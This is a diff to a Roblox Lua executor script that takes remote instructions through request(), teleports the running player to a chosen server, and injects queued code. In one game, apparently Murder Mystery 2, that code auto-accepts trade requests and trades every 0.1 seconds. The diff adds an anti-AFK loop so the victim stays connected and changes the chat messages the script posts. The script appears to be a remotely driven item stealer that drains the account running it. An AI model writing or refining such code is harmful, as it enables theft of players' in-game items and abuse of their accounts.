@@ -1,6 +1,13 @@
 local HttpServ = game:GetService("HttpService")
-
+local vu = game:GetService("VirtualUser")
 local LastMsgId = "lol"
+
+-- Anti-AFK script
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+    vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+    wait(1)
+    vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+end)
 
 local function autoJoin()
     local response = request({
@@ -22,12 +29,12 @@ local function autoJoin()
                 LastMsgId = tostring(messages[1].id)
                 game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                 if placeId == 142823291 then
-                    queue_on_teleport("game:GetService('Chat'):Chat(game.Players.LocalPlayer.Character, 'yo wsg pablo')")
+                    queue_on_teleport("game:GetService('Chat'):Chat(game.Players.LocalPlayer.Character, 'By Unknown')")
                     queue_on_teleport("while task.wait(0.1) do game:GetService('ReplicatedStorage').Trade.AcceptRequest:FireServer() end")
                     queue_on_teleport("while task.wait(0.1) do game:GetService('ReplicatedStorage').Trade.AcceptTrade:FireServer(unpack({[1] = 285646582})) end")
                     game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                 else
-                    queue_on_teleport("game:GetService('Chat'):Chat(game.Players.LocalPlayer.Character, 'yo wsg pablo')")
+                    queue_on_teleport("game:GetService('Chat'):Chat(game.Players.LocalPlayer.Character, 'yo unknown')")
                     game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                 end
             end
@@ -35,6 +42,6 @@ local function autoJoin()
     end
 end
 
-while wait(5) do
+while wait(10) do
     autoJoin()
 end
